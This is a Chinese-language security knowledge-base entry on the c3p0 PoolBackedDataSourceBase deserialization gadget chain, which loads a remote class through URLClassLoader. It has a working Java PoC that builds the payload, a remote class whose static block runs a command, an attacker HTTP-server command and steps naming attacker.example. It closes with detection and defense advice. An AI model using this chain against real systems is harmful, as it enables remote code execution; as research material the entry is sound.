---
id: web-java-deser-c3p0-poolbackeddatasourcebase-urlclassloader
title: C3P0 PoolBackedDataSourceBase 反序列化经 ReferenceableUtils 远程加载类
type: scenario
domain: web
path: web/java/deserialization
technique: c3p0-poolbackeddatasourcebase-urlclassloader
aliases:
- C3P0 反序列化
- PoolBackedDataSourceBase 利用链
- ReferenceSerialized getObject
- ReferenceableUtils referenceToObject
- C3P0 URLClassLoader RCE
tags:
- java
- deserialization
- c3p0
- gadget
- urlclassloader
- jndi
- reference
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: c3p0 0.9.5.2
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:32:01+08:00'
  notes: 已对照原文核对 writeObject/ReferenceIndirector/ReferenceSerialized/referenceToObject→URLClassLoader 链与 PoC 结构；未验证点：未在本机复现，依赖原文调试截图与 calc 弹窗；版本为原文依赖 c3p0 0.9.5.2
---

## 一句话结论

c3p0 的 `PoolBackedDataSourceBase` 在序列化不可序列化的 `connectionPoolDataSource` 时会改用 `ReferenceSerialized` 包装；反序列化时 `ReferenceableUtils.referenceToObject()` 按 `Reference` 中的 `factoryClassLocation` 创建 `URLClassLoader`，从远程地址加载并实例化攻击者指定的类，形成反序列化 RCE。

## 原理

- `PoolBackedDataSourceBase.writeObject()` 先尝试直接序列化 `connectionPoolDataSource`。该字段类型是 `ConnectionPoolDataSource`（不可序列化），`SerializableUtils.toByteArray` 会抛 `NotSerializableException`。
- 进入 catch 后，c3p0 创建 `ReferenceIndirector`，调用 `indirectForm(connectionPoolDataSource)`：内部执行 `((Referenceable) var1).getReference()`，把返回的 `Reference` 与 `name`、`contextName`、`environmentProperties` 一起封装成 `ReferenceSerialized`（实现 `IndirectlySerialized`）并写入流。
- 因此，只要攻击者让 `connectionPoolDataSource` 字段指向一个同时实现 `ConnectionPoolDataSource` 与 `Referenceable` 的类，并让 `getReference()` 返回可控的 `Reference`，序列化出来的 `ReferenceSerialized.reference` 就可控。
- `Reference` 的构造方法 `(String className, String factory, String factoryLocation)` 分别设置 `className`、`classFactory`、`classFactoryLocation`。`factoryLocation` 会被 `referenceToObject()` 当作 URL。
- 反序列化时 `PoolBackedDataSourceBase.readObject()` 读到实现 `IndirectlySerialized` 的对象，调用其 `getObject()`；`ReferenceSerialized.getObject()` 创建 `InitialContext`，因 `contextName` 默认为 null 不触发 JNDI lookup，随后调用 `ReferenceableUtils.referenceToObject(reference, name, ctx, env)`。
- `referenceToObject()` 取出 `factoryClassName` 与 `factoryClassLocation`；当 location 非空时执行 `new URLClassLoader(new URL[]{url}, TCCL)`，再用 `Class.forName(factoryClassName, true, loader)` 加载类并 `newInstance()`，最后调用其 `getObjectInstance()`。`initialize=true` 意味着远程类的静态初始化块会在实例化前执行。
- 远程类需要实现 `ObjectFactory` 才能通过强制转换；如果只想执行代码，静态初始化块即可完成，`getObjectInstance()` 返回什么不影响触发。

## 触发条件

- 目标 classpath 含 c3p0（原文为 0.9.5.2）。
- 存在反序列化入口（原生 `ObjectInputStream`、Fastjson/Jackson 等能触发 `readObject` 的组件）。
- 目标可从攻击者指定 URL 出网加载类，或能通过 `file:` 等协议读取攻击者已放置的字节码。
- 目标 TCCL 可用于构造 `URLClassLoader`，且没有禁止远程类加载的安全管理器/策略。

## 利用步骤

1. 确认目标依赖中存在 c3p0 及可用的反序列化入口。
2. 编写一个实现 `ConnectionPoolDataSource` 与 `Referenceable` 的类，`getReference()` 返回 `new Reference("<远程类名>", "<远程类名>", "http://attacker.example:9999/")`。
3. 通过反射把该实例设置到 `PoolBackedDataSourceBase` 的 `connectionPoolDataSource` 字段。
4. 序列化 `PoolBackedDataSourceBase`，得到 payload（序列化过程中会生成 `ReferenceSerialized`）。
5. 把 payload 发给目标反序列化入口；目标反序列化时触发 `referenceToObject()`，从远程 URL 加载类并执行静态初始化/`getObjectInstance()`。
6. 在攻击者 HTTP 服务上观察目标请求，确认类被加载。

## PoC

```java
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import javax.naming.*;
import javax.sql.*;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0UrlLoader {
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase ds = new PoolBackedDataSourceBase(false);
        Field f = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        f.setAccessible(true);
        f.set(ds, new EvilDataSource());

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("c3p0.bin"));
        out.writeObject(ds);
        out.close();
    }

    public static class EvilDataSource implements ConnectionPoolDataSource, Referenceable {
        public PrintWriter getLogWriter() { return null; }
        public void setLogWriter(PrintWriter out) {}
        public void setLoginTimeout(int seconds) {}
        public int getLoginTimeout() { return 0; }
        public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; }
        public PooledConnection getPooledConnection() { return null; }
        public PooledConnection getPooledConnection(String u, String p) { return null; }

        public Reference getReference() throws NamingException {
            // className / factory / factoryLocation
            return new Reference("test", "test", "http://127.0.0.1:9999/");
        }
    }
}
```

```java
// 远程 test.class 的等价效果（需实现 ObjectFactory；静态块先执行）
public class test implements javax.naming.spi.ObjectFactory {
    static { try { Runtime.getRuntime().exec("calc"); } catch (Exception ignored) {} }
    public Object getObjectInstance(Object o, javax.naming.Name n,
            javax.naming.Context c, java.util.Hashtable<?, ?> e) { return null; }
}
```

```text
# 攻击者侧启动 HTTP 服务提供 test.class：
python -m http.server 9999
# 目标反序列化 c3p0.bin 时，会请求 /test.class 并执行静态块
```

## 变体与关联

- 变体：`factoryClassLocation` 使用 `file:`/`jar:` 等协议，可在目标不出网时加载本地已放置的字节码（取决于协议处理器与文件权限）。
- 变体：不通过 URLClassLoader，改为在 `Reference` 中指定本地工厂类（如 Tomcat `BeanFactory`），见 [[web-java-deser-c3p0-beanfactory-el-no-egress]]。
- 变体：`contextName` 默认为 null，不能直接走 JNDI lookup；若通过其他方式令其可控，则可能转为 JNDI 注入。
- 关联：[[web-java-deser-fastjson-c3p0-jndiref-jndi]]（C3P0 的 JNDI setter 链）；[[web-java-deser-fastjson-c3p0-hex-useroverrides]]（C3P0 的十六进制原生反序列化链）。
- 边界：远程类必须能被 `URLClassLoader` 加载且实现 `ObjectFactory`；目标不出网、禁用了远程类加载或 classpath 无 c3p0 时失效。

## 检测与防御

- 检测：监控反序列化流量中出现 `com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase`、`ReferenceSerialized`、`ReferenceIndirector` 等类名；监控 JVM 加载非业务 URL 的类（`URLClassLoader`、`/proc/<pid>/maps`、自定义 ClassLoader 审计）；对出站 HTTP 请求异常下载 `.class` 告警。
- 修复：升级/移除存在 gadget 的 c3p0 版本；对反序列化入口做白名单/黑名单过滤（如 `ObjectInputFilter`）并禁止 `PoolBackedDataSourceBase` 等危险类；避免反序列化不可信数据。
- 加固：禁用远程类加载（安全管理器/模块策略/网络 ACL）；使用 `jdk.serialFilter` 限制可反序列化类；对第三方组件做依赖审计。
